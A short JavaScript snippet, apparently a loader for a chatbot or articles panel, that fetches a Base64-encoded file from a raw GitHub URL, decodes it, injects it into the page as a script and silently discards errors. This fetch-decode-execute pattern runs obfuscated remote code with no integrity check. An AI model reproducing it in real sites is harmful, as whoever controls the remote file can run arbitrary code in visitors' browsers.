async function injectPayload(url) {
    try {
        const response = await fetch(url);
        let data = await response.text();
          // فك تشفير Base64
        let decoded = atob(data.trim());
        
   
        let fixedContent = decodeURIComponent(escape(decoded));
        
        const script = document.createElement('script');
        script.textContent = fixedContent;
        document.body.appendChild(script);
        
        setTimeout(() => {
            if (typeof openArticlesBotPanel === 'function') openArticlesBotPanel();
        }, 500);
    } catch (err) {
       
    }
}

injectPayload('https://raw.githubusercontent.com/raadchat/Chat2/main/Botchat2.txt');
